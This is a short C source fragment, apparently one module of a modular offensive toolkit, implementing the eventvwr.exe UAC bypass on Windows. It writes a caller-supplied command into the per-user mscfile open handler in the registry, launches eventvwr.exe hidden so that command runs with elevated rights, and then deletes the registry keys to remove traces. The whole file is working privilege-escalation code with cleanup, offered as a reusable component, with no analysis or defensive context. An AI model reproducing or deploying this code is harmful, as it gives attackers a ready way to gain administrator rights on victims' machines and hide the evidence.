// chunk: privesc/uac_eventvwr
// depends: (none)
// provides: uac_bypass_eventvwr
// note: UAC bypass via eventvwr.exe — mscfile handler hijack

#ifndef CHUNK_PRIVESC_UAC_EVENTVWR
#define CHUNK_PRIVESC_UAC_EVENTVWR

static int uac_bypass_eventvwr(const char *cmd_to_run) {
    HKEY hKey;
    const char *keyPath = "Software\\Classes\\mscfile\\shell\\open\\command";

    if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
                        &hKey, NULL) != ERROR_SUCCESS) {
        return 0;
    }

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmd_to_run, (DWORD)strlen(cmd_to_run) + 1);
    RegCloseKey(hKey);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "open";
    sei.lpFile = "C:\\Windows\\System32\\eventvwr.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    BOOL result = ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile");

    return result ? 1 : 0;
}

#endif
